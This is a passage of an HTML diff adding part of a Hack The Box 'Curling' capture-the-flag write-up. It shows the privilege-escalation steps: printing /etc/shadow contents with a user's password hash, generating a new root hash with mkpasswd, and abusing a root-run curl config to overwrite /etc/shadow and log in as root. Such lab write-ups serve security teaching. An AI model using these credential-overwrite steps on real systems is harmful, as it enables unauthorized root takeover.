+                _apt<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                lxd<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                uuidd<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                dnsmasq<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                landscape<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                pollinate<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                sshd<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                floris<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#7f0044;font-weight:400">$6$yl7KKyGaOhVExlCb$ONJceChbI7srpLlJ</span><span style="color:#ff9d00;font-weight:700">/</span>AhCLgESU7E4gXexPVgsJMjvQ0hP.6fwslfwWmD15cuaYs9.<span style="color:#ff9d00;font-weight:700">/</span>Jin4e<span style="color:#ff9d00;font-weight:700">/</span>4LURPgEBav4iv<span style="color:#ff9d00;font-weight:700">//:</span>17673<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                mysql<span style="color:#ff9d00;font-weight:700">:!:</span>17673<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span>
+            </div>
+        </div><br>
+        <br>
+        I made a new root password (muchroot) in the same format as the one found in /etc/shadow:<br>
+        1. <code>root@kali:~/htbCurling# mkpasswd -m sha-512 -S editeded -s</code><br>
+        Password: <code>muchroot</code><br>
+        <br>
+        • because of the <code>$6</code> at the beginning of the hash, this tells us that it's a sha-512<br>
+        • because of this block: $6$<code>RIgrVboA</code>$, you can tell there's salt length of 8 characters<br>
+        <br>
+        <code>$6$editeded$0W5lR0/8XbYYHc8WajNeGRBZnwt.6kcQRXQ0VixGe0pchufsUBS7TOrclexI03WTEBZNdm6r56WJ5nOxZLC2p/</code><br>
+        <br>
+        2. Now replace root's sha-512 password hash in Curling's /etc/shadow file. The modified /etc/shadow should look like this (only root has changed):<br>
+            <div class="codebox">
+                root<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#7f0044;font-weight:400">$6$editeded$0W5lR0</span><span style="color:#ff9d00;font-weight:700">/</span>8XbYYHc8WajNeGRBZnwt.6kcQRXQ0VixGe0pchufsUBS7TOrclexI03WTEBZNdm6r56WJ5nOxZLC2p<span style="color:#ff9d00;font-weight:700">/:</span>17673<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                daemon<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                bin<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                sys<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                <span style="color:#ff9d00;font-weight:700">sync:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                games<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                <span style="color:#ff9d00;font-weight:700">man:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                <span style="color:#ff9d00;font-weight:700">lp:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                mail<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                news<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                uucp<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                proxy<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                www-data<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                backup<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                list<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                irc<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                gnats<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                nobody<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                systemd-network<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                systemd-resolve<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                syslog<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                messagebus<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                _apt<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                lxd<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                uuidd<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                dnsmasq<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                landscape<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                pollinate<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                sshd<span style="color:#ff9d00;font-weight:700">:</span>*<span style="color:#ff9d00;font-weight:700">:</span>17647<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                floris<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#7f0044;font-weight:400">$6$yl7KKyGaOhVExlCb$ONJceChbI7srpLlJ</span><span style="color:#ff9d00;font-weight:700">/</span>AhCLgESU7E4gXexPVgsJMjvQ0hP.6fwslfwWmD15cuaYs9.<span style="color:#ff9d00;font-weight:700">/</span>Jin4e<span style="color:#ff9d00;font-weight:700">/</span>4LURPgEBav4iv<span style="color:#ff9d00;font-weight:700">//:</span>17673<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+                mysql<span style="color:#ff9d00;font-weight:700">:!:</span>17673<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">:</span>99999<span style="color:#ff9d00;font-weight:700">:</span>7<span style="color:#ff9d00;font-weight:700">:::</span><br>
+            </div>
+        </div><br>
+        <br>
+        Now we transfer our modified <code>/etc/shadow</code> over to the Curling box:<br>
+        <br>
+        1. Make a temp directory on Curling for this new /etc/shadow to be transferred to:<br>
+        <code>floris@curling:~/admin-area$ mkdir /tmp/wizadry</code><br>
+        2. Copy the modified /etc/shadow over via scp<br>
+        <code>root@kali:~/htbCurling# scp shadow floris@10.10.10.150:/tmp/wizadry/shadow</code><br>
+        3. Check it's there<br>
+        <code>floris@curling:~/admin-area$ cat /tmp/wizadry/shadow</code><br>
+        <br>
+        Back on curling, modify <code>input</code> to 'upload' our modified /etc/shadow to the system. -T is upload, URL is where to upload to:<br>
+        1. <code>floris@curling:~/admin-area$ nano input</code><br>
+        <code>-T "/tmp/wizadry/shadow"<br></code> <code>URL="file:///etc/shadow"</code><br>
+        2. Watch the <code>report</code> file to check when our file gets uploaded<br>
+        <code>floris@curling:~/admin-area$ watch -n 5 cat report</code><br>
+        <br>
+        When the file gets uploaded, <code>report</code> should be blank<br>
+        <br>
+        Now we should be able to log in as root because the password's been changed.<br>
+        I set the root password to <code>muchroot</code>, so the login will be <code>root / muchroot</code><br>
+        <code>floris@curling:~/admin-area$ su root</code><br>
+        <code>muchroot</code><br>
+        <br>
+        Success!<br>
+        Don't try ssh'ing as root because that's usually disabled by default.<br>
+        Use <code>su</code> instead
+    </writeup>
+</section>
+
+</body>
+</html>
